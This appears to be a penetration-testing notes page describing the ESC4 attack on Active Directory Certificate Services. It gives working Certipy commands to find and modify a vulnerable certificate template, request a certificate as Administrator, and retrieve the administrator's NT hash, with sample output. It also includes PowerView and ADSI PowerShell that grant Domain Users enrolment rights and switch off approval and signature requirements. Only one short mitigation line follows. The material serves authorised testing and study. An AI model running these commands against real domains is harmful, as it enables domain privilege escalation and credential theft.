# ESC4

## Description <a href="#description" id="description"></a>

ESC4 abuse is where a low privilege user possess permissions over a certificate template which could be used to make it vulnerable to other attacks such as ESC1 or ESC2. In theory, the templates could be modified to support any misconfiguration based attack but, the simplest would be to make it vulnerable to ESC1 and ESC2.&#x20;

### Requirements for attack path <a href="#requirements-for-attack-path" id="requirements-for-attack-path"></a>

Access to an account that has at least ONE of the following permissions over a template:

* Owner
* Write Owner Principals
* Write Property Principals
* Write DACL Principals

Changes required to a template to make it vulnerable to ESC1 attacks.

* Disable manage approval
* disable authorized signatures
* enable the flag `ENROLLEE_SUPPLIES_SUBJECT` in `mspki-certificate-name-flag`.
* Set the `mspki-certificate-application-policy` to be used for authentication, such as `Any Purpose` or `Client Authentication.`&#x20;

## Linux

### Enumeration

{% code overflow="wrap" %}
```python
certipy find -u 'Moe@Security.local' -p 'Password123' -dc-ip 10.10.10.100 -vulnerable -stdout | grep ESC4
```
{% endcode %}

### Performing the attack

Before making any changes, certipy can be used to save the current configuration of a template, so it can be restored to its original form later.

{% code overflow="wrap" %}
```python
certipy template -u 'moe@security.local' -p 'Password123' -dc-ip 10.10.10.100 -template ESC4 -save-old
```
{% endcode %}

```
[*] Saved old configuration for 'ESC4' to 'ESC4.json'
[*] Updating certificate template 'ESC4'
[*] Successfully updated 'ESC4'
```

This command will make the selected template vulnerable to ESC1 attacks. Below, shows the ESC4 vulnerable template after modification. We can see how now any authenticated user on the domain could abuse this for escalation.

<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

We can then perform the ESC1 attack against the template and grab

{% hint style="warning" %}
For accuracy and to avoid certificate mismatch issues we should always aim to provide the -sid parameter which should be the value of the UPN we are targeting (administrator@security.local in the example below).
{% endhint %}

{% code overflow="wrap" %}
```python
certipy req -u 'moe@security.local' -p 'Password123' -dc-ip 10.10.10.100 -ca SECURITY-CA-CA -target-ip 10.10.10.2 -template ESC4 -upn Administrator@security.local -sid S-1-5-21-13999771-2333344039-1820745628-500 -out cert
```
{% endcode %}

```
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 39
[*] Got certificate with UPN 'Administrator@security.local'
[*] Certificate object SID is 'S-1-5-21-13999771-2333344039-1820745628-500'
[*] Saved certificate and private key to 'cert.pfx'
```

Then use the generated pfx (cert.pfx) to grab the NTLM hash for the account.

{% code overflow="wrap" %}
```python
certipy auth -pfx cert.pfx -username administrator -domain security.local -dc-ip 10.10.10.100 
```
{% endcode %}

```
[*] Using principal: administrator@security.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@security.local': aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe
```

{% hint style="danger" %}
Ensure to restore the original template configuration once this attack has been achieved.
{% endhint %}

{% code overflow="wrap" %}
```python
certipy template -u 'moe@security.local' -p 'Password123' -dc-ip 10.10.10.100 -template 'ESC4' -configuration ESC4.json 
```
{% endcode %}

## Windows

{% hint style="danger" %}
These notes for Windows do not discuss restoring the altered configuration. Whilst the practice below is valid for CTF and lab envrionments, do not perform the actions below on a real engagement without first checking with the client that they have backed up the template to be modified.\
\
It is preffered to use Certipy if on an engagement in order to restore the old configuration.
{% endhint %}

{% hint style="info" %}
Note to self, it should be in theory possible to create a backup JSON or XML file of a certificate templates configuration and restore with ADSI. Should look into completing this and adding these notes to this section.
{% endhint %}

### Enumeration

Certify is not able to discern vulnerable certificate templates via its 'find /vulnerable' module for ESC4 and requires manual identification.

```
.\Certify.exe find
```

<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

### Performing the attackE

The following modifications require to be complete. The example below uses PowerView.

```powershell
# add Certificate-Enrollment rights to the Domain Users group
Add-DomainObjectAcl -TargetIdentity ESC4 -PrincipalIdentity "Domain Users" -RightsGUID "0e10c968-78fb-11d2-90d4-00c04f79dc55" -TargetSearchBase "LDAP://CN=Configuration,DC=lab,DC=local" -Verbose

# Disable Manager Approval
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" -Identity ESC4 -Set @{'mspki-enrollment-flag'=9} -Verbose

# Disable Authorized Signature Requirement. Set mspki-ra-signature attribute to 0
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" -Identity ESC4 -Set @{'mspki-ra-signature'=0} -Verbose

# Modify SAN for ENROLLEE_SUPPLIED_SUBJECT
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" -Identity ESC4 -Set @{'mspki-certificate-name-flag'=1} -Verbose

# Set EKU for Client Authentication (Run Both)
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" -Identity ESC4 -Set @{'pkiextendedkeyusage'='1.3.6.1.5.5.7.3.2'} -Verbose
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" -Identity ESC4 -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose
```

Or using the following native ADSI commands

```powershell
$certTemplate = [ADSI]"LDAP://CN=ESC4,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=SECURITY,DC=LOCAL"

# Get the existing security descriptor
$securityDescriptor = $certTemplate.psbase.ObjectSecurity

# Create a new access rule for "Domain Users"
$domainUsers = New-Object System.Security.Principal.NTAccount("Domain Users")
$guid = New-Object Guid("0e10c968-78fb-11d2-90d4-00c04f79dc55")
$accessRule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($domainUsers, "ExtendedRight", "Allow", $guid)
$securityDescriptor.AddAccessRule($accessRule)
$certTemplate.psbase.ObjectSecurity = $securityDescriptor

# Disable manager approval
$certTemplate.put("mspki-enrollment-flag", 9)

# Disable Authorized Signature Requirement. Set mspki-ra-signature attribute to 0
$certTemplate.put("mspki-ra-signature", 0)

# Modify SAN for ENROLLEE_SUPPLIES_SUBJECT
$certTemplate.put("mspki-certificate-name-flag", 1)

# Set EKU for Client Authentication
$certTemplate.put("pkiextendedkeyusage", "1.3.6.1.5.5.7.3.2")
$certTemplate.put("mspki-certificate-application-policy", "1.3.6.1.5.5.7.3.2")

# Provision changes
$certTemplate.SetInfo()
```

After making the changes above and enumerating the certificate configuration again, we should see the template is now vulnerabl to ESC1.

<figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

From here we can follow the attack methodology for ESC1 as described here:

{% content-ref url="esc1.md" %}
[esc1.md](esc1.md)
{% endcontent-ref %}

## Mitigations

* Set appropriate access controls on the template object. Remove overly permissive permissions from unexpected or low level users and groups.



